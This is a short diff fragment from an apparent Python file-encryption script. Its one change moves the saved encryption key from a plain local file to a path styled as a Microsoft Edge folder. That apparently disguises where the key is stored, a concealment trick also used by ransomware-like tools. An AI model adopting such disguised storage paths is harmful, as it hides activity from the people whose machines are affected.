@@ -17,7 +17,7 @@ def encrypt_file(key):
         encrypted_file.write(encrypted_data)
 
 def save_key_to_file(key):
-    with open("encryption_key.txt", 'wb') as key_file:
+    with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\encryption_key.txt", 'wb') as key_file:
         key_file.write(key)
 
 if __name__ == "__main__":
